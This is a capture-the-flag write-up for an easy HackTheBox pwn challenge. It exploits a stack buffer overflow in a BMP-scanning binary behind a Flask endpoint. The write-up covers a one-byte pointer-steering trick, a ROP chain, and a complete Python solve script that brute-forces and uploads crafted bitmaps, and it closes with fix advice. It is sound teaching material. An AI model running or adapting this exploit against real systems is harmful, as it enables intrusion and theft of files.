## Overview

`Snow Scan` is an easy HackTheBox **Pwn** challenge. A Flask endpoint accepts a `.bmp` upload,
runs a static C "scanner" binary on it, and returns the program's stdout. The scanner copies the
bitmap's pixel data into a stack buffer with no length check — a textbook
[out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) — but the copy loop keeps
its own index and destination pointer on the stack *below* the return address, so it sabotages
itself before a plain overflow can land. We defeat that by steering the write cursor with a
one-byte pointer edit, then ROP through the No-PIE static binary to call its own file-printing
helper on `flag.txt`.

## The technique

The web handler runs `./snowscan uploads/<file>` and returns stdout, so anything the binary prints
comes back in the HTTP response. The binary ships a convenient helper:

```c
void printFile(char *fname) {   // fopen(fname,"r") + print every byte + exit(0)
```

So the goal is simply: make the binary call `printFile("flag.txt")`. The challenge directory holds
`flag.txt`, and that path is relative to the binary's working directory.

The bug is in the pixel-copy loop:

```c
uint8_t pixelBuf[bmp->imageSize];   // VLA, imageSize bounded 400..900
int c = 0, i = 0;
while((c = fgetc(file)) != EOF)
    pixelBuf[i++] = (uint8_t)c;     // no bound on i -> stack buffer overflow
```

The `imageSize` check only bounds the *size of the VLA*, never how many bytes are read. EOF is the
only stop condition, so a file larger than `imageSize` walks `i` straight off the end of `pixelBuf`,
over the saved registers and the return address.

Two things make this exploitable cleanly:

- **No canary in `main`.** `checksec` reports "Canary found", but `main`'s VLA epilogue
  (`mov rbx,rsp ; lea -0x28(rbp),rsp ; pop … ; ret`) does **no** `__stack_chk_fail` — the canary
  lives in other functions. Always disassemble the real epilogue rather than trusting `checksec`.
- **No PIE, static binary.** Every gadget and `printFile` is at a fixed address, so we need no leak.

### The twist: a self-clobbering copy loop

The copy reloads **both** loop variables from the stack every iteration:

```
mov eax, [rbp-0x34]      ; i
mov rdx, [rbp-0x60]      ; pixelBuf pointer
mov [rdx+rax], cl        ; pixelBuf[i] = c
```

Measured from the start of `pixelBuf`: the **pointer slot is at offset 432, the index slot at 476,
and saved RIP at 536.** A naive linear flood reaches the pointer slot (432) *before* RIP (536) and
overwrites the pointer with filler — every subsequent write is then redirected to garbage and RIP is
never touched. The overflow corrupts its own write cursor.

### Steering the cursor with one byte

Don't fight the pointer — *steer* it. When `i` reaches the pointer's least-significant byte
(offset 432), write a single value `V` instead of filler. The reloaded pointer becomes
`(base & ~0xff) | V`, so the very next write (`i = 433`) lands at `(base & ~0xff) + V + 433`.
Choosing

```
V = (base & 0xff) + 103        # 103 = 536 - (432 + 1)
```

makes that address equal `base + 536` = **saved RIP**. The cursor leaps over the index slot (476),
which is therefore never clobbered and keeps counting cleanly, and the ROP chain streams directly
onto the return address.

`base & 0xff` is unknown thanks to stack ASLR — but Linux stack ASLR is **page-granular**, so
`base & 0xfff` is fixed for a given argv/env. There is exactly one correct `V`, and 16-byte stack
alignment plus the constant jump pin its low nibble to `7`. That leaves just **16 candidates**
(`0x07, 0x17, … 0xf7`) — brute them and one pops the flag.

## Solution

The ROP chain (all fixed addresses) writes `"flag.txt"` into zeroed `.bss` and calls `printFile`:

```
pop rsi ; ret        -> "flag.txt"
pop rdi ; ret        -> .bss scratch (0x4c3400, zero-initialised -> byte 9 is the NUL)
mov [rdi], rsi ; ret -> store the string
pop rdi ; ret        -> .bss scratch
printFile            -> fopen("flag.txt","r") + print to stdout + exit(0)
```

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, struct, requests

PTR_LSB_OFF = 432               # offset of pixelBuf-pointer LSB
RET_OFF     = 536               # offset of saved return address (index slot 476 in between)

POP_RDI   = 0x401a72            # pop rdi ; ret
POP_RSI   = 0x40f97e            # pop rsi ; ret
WRITE     = 0x44e2bf            # mov qword ptr [rdi], rsi ; ret
RET       = 0x401a73            # ret  (stack alignment)
PRINTFILE = 0x401fac            # void printFile(char *fname)
BSS       = 0x4c3400            # zeroed .bss scratch ("flag.txt"+NUL)

def p64(x): return struct.pack('<Q', x)

def rop_chain():
    return (p64(RET) + p64(POP_RDI) + p64(BSS)
            + p64(POP_RSI) + b'flag.txt'
            + p64(WRITE)
            + p64(POP_RDI) + p64(BSS)
            + p64(PRINTFILE))

def build_bmp(V):
    h  = b'BM' + b'\x00'*8 + struct.pack('<I', 54) + struct.pack('<I', 40)
    h += struct.pack('<i', 20) + struct.pack('<i', 20)   # width == height (scan dim)
    h += struct.pack('<H', 1) + struct.pack('<H', 8)     # colorPlanes, bpp
    h += struct.pack('<I', 0) + struct.pack('<I', 400)   # compression, imageSize (VLA size)
    h += b'\x00'*16
    return h + b'A'*PTR_LSB_OFF + bytes([V & 0xff]) + rop_chain()

def main():
    url = sys.argv[1].rstrip('/')
    for V in [(0x07 + 0x10*k) & 0xff for k in range(16)]:   # 16 alignment-valid LSBs
        out = requests.post(url + '/snowscan',
                            files={'file': ('exploit.bmp', build_bmp(V))}, timeout=10).text
        if 'HTB{' in out:
            import re
            print(V, re.search(r'HTB\{[^}]*\}', out).group(0))
            return
    print("brute exhausted")

if __name__ == '__main__':
    main()
```

Run it against the live instance:

```bash
python3 solve.py http://<target-host>:<port>
```

It walks the 16 candidate LSBs and prints the flag on the one that lands the chain on RIP:

```
HTB{...}
```

## Why it worked

The read length was governed by `EOF` instead of the destination buffer size — a classic
[stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html). The unusual part is that
the copy loop keeps its index and destination pointer on the stack between the buffer and the saved
return address, so a linear overwrite destroys its own state first. The key insight is that you do
not need to *preserve* those variables — a single-byte edit to the pointer's least-significant byte
*redirects* the write cursor past the loop state and onto RIP, and page-granular ASLR shrinks the
unknown byte to a 16-way brute force. From there, a No-PIE static binary with a built-in
file-printer and no canary in `main` makes the rest a short, leak-free ROP chain.

## Fix / defense

- **Bound the copy:** `while(i < bmp->imageSize && (c = fgetc(file)) != EOF) pixelBuf[i++] = c;` — the
  read must respect the buffer size, not just `EOF`.
- **Compile with hardening that actually applies:** a real stack canary covering `main`, full RELRO,
  and PIE would each have raised the bar significantly.
- **Don't ship a primitive like `printFile`** that opens an attacker-influenceable path in a process
  reachable from untrusted input.
